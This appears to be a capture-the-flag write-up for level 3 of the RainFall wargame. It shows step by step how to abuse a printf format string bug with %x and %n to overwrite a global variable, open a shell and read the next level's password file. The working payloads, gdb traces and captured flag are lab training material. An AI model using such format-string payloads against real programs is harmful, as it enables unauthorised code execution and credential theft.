# level 03

The program take no parameters but wait for input once launched. It doesn't looks like to segault with large strings :

```bash
level3@RainFall:~$ python -c 'print "A" * 30' | ./level3 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
level3@RainFall:~$ python -c 'print "A" * 100' | ./level3 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
level3@RainFall:~$ python -c 'print "A" * 200' | ./level3 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

By looking at the assembly code, we can see that the function to inspect is the `v` function.

Basically, this function takes an input with `fgets`, and pass it as the only parameter to `printf`. Then, it checks if a variable `m` is equals to 64 and open a shell if it's true. Our objective is so to modify the value of this variable as it is 0 by default :

```gdb
(gdb) x/d 0x804988c
0x804988c <m>:  0
```

As seen in the bug section of printf man, passing directly the user input to `printf` is a security hole. We can exploit this program with a [Format String Exploit](https://en.wikipedia.org/wiki/Uncontrolled_format_string).

We can check this by trying to print the stack :

```gdb
(gdb) run
Starting program: /home/user/level3/level3 
%x %x %x %x
200 b7fd1ac0 b7ff37d0 25207825

Breakpoint 1, 0x080484da in v ()
(gdb) x/24wx $esp
0xbffff500:     0xbffff510      0x00000200      0xb7fd1ac0      0xb7ff37d0
0xbffff510:     0x25207825      0x78252078      0x0a782520      0xb7fef300
0xbffff520:     0xbffff578      0xb7fde2d4      0xb7fde334      0x00000007
```

Here, `printf` begin by printing the stack from `0xbffff504`. If we take an input before printing stack value, we can see that our argument is at the 4th position :

```gdb
(gdb) run
Starting program: /home/user/level3/level3 
AAAA %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520

Breakpoint 1, 0x080484da in v ()
(gdb) x/24wx $esp
0xbffff500:     0xbffff510      0x00000200      0xb7fd1ac0      0xb7ff37d0
0xbffff510:     0x41414141      0x20782520      0x25207825      0x78252078
0xbffff520:     0xbfff000a      0xb7fde2d4      0xb7fde334      0x00000007
```

Thanks to the `%n` modifier, we can write at a special address by filling it's value with the number of printed bytes :

```gdb
(gdb) r <<< $(python -c 'print "\x8c\x98\x04\x08" + "%4$n"')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level3/level3 <<< $(python -c 'print "\x8c\x98\x04\x08" + "%4$n"')
��

Breakpoint 1, 0x080484da in v ()
(gdb) x/d 0x0804988c
0x804988c <m>:  4
```

We can see that the `m` variable taked the value of the printed bytes, here 4.

We need to print 60 more bytes to changed its value to 64.

Get the flag :

```bash
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "%60x" + "%4$n"';cat) | ./level3
�                                                         200
Wait what?!
cd ../level4
cat .pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
